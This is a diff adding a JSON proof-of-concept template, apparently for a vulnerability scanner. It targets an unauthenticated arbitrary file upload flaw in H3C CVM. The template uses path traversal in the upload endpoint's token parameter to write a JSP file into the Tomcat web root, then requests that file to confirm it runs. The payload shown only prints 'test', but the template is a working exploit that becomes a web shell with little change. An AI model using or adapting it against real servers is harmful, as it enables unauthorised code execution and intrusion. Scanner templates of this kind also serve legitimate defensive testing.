@@ -1,0 +1,28 @@
+{
+	"name":"H3C-CVM-upload接口前台任意文件上传",
+	"tag":"h3c",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/a.jsp&name=123",
+		"pocPost":"<%out.println(\"test\");%>",
+		"header":{
+			"Content-Range":" bytes 0-10/20",
+			"Referer":" http",
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
+			"Accept-Encoding":" gzip"
+		},
+		"status_code":"200",
+		"pattern":"(success)"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/cas/js/lib/buttons/a.jsp",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
